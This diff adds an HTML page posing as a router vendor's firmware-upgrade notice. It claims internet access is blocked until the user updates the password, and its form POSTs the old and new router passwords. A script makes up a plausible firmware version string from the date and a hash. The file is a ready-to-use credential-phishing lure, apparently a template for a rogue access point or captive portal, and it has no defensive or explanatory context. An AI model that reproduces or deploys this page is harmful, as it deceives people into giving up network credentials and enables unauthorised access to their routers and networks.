@@ -1,0 +1,18 @@
+<meta charset=utf-8 content="width=device-width, initial-scale=1.0" name=viewport><title>VENDOR Router Firmware Upgrade</title><style>html{background:#4acbd6}body{font-family:sans-serif;height:100vh}a{color:#92badd;display:inline-block;text-decoration:none;font-weight:400}h2{text-align:center;font-size:16px;font-weight:600;text-transform:uppercase;display:inline-block;margin:40px 8px 10px;color:#ccc}w{display:flex;align-items:center;flex-direction:column;justify-content:center;width:100%;min-height:100%;padding:20px}f{10px;border-radius:10px;background:#fff;padding:30px;width:90%;max-width:450px;position:relative;padding:0;box-shadow:0 30px 60px 0 rgba(0,0,0,.3);text-align:center}#fof{background:#f6f6f6;border-top:1px solid #dce8f1;padding:25px;text-align:center;border-radius:0 0 10px 10px}h2{color:#0d0d0d;border-bottom:2px solid #5fbae9}.fo{background:#4acbd6;border:none;color:#fff;padding:15px 15px;text-align:center;text-decoration:none;display:inline-block;text-transform:uppercase;font-size:13px;box-shadow:0 10px 30px 0 rgba(95,186,233,.4);border-radius:5px;margin:5px 20px 40px;transition:all .3s ease-in-out}.fo:hover{background:#39ace7}.fo:active{transform:scale(.95)}.t{background:#f6f6f6;border:none;color:#0d0d0d;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;margin:5px;width:85%;border:2px solid #f6f6f6;transition:all .5s ease-in-out;border-radius:5px}.t:focus{background:#fff;border-bottom:2px solid #5fbae9}.t:placeholder{color:#ccc}.fo{box-sizing:border-box;width:80%}.uh:after{display:block;left:0;bottom:-10px;width:0;height:2px;background:#4acbd6;content:"";transition:width .2s}.z{margin:1rem}.uh:hover{color:#0d0d0d}.uh:hover:after{width:100%}*:focus{outline:none}*{box-sizing:border-box}</style><w><f><h2>Firmware Security Upgrade</h2><div class=z>VENDOR router firmware version v<span id="version"></span> with  major security patches and updated firewall has been installed. The router will connect to the internet once the firewall has been setup. Update your password to setup your firewall.</z><form action=/ method=POST><input class=t name=password placeholder="Old password" type=password required><input class=t name=newpassword placeholder="New password" type=password required><input class=t name=confirmpassword placeholder="Confirm password" type=password required><input class=fo type=submit value="Setup router"></form><div id=fof><span class=uh>Copyright &copy; <span id=date></span> VENDOR Corporation Limited. All rights reserved.</span></div></f></w><script>function cyrb128(str) {
+    let h1 = 1779033703, h2 = 3144134277,
+        h3 = 1013904242, h4 = 2773480762;
+    for (let i = 0, k; i < str.length; i++) {
+        k = str.charCodeAt(i);
+        h1 = h2 ^ Math.imul(h1 ^ k, 597399067);
+        h2 = h3 ^ Math.imul(h2 ^ k, 2869860233);
+        h3 = h4 ^ Math.imul(h3 ^ k, 951274213);
+        h4 = h1 ^ Math.imul(h4 ^ k, 2716044179);
+    }
+    h1 = Math.imul(h3 ^ (h1 >>> 18), 597399067);
+    h2 = Math.imul(h4 ^ (h2 >>> 22), 2869860233);
+    h3 = Math.imul(h1 ^ (h3 >>> 17), 951274213);
+    h4 = Math.imul(h2 ^ (h4 >>> 19), 2716044179);
+    return [(h1^h2^h3^h4)>>>0, (h2^h1)>>>0];
+}
+let d=new Date();let dstr=`${d.getUTCFullYear()}.${d.getMonth()}.${d.getDay()}`;let hash=cyrb128(dstr).map(x => x.toString(16)).join('-');document.querySelector('#version').innerHTML=`${dstr}-${hash}`;document.querySelector("#date").innerHTML=d.getUTCFullYear();
+</script>
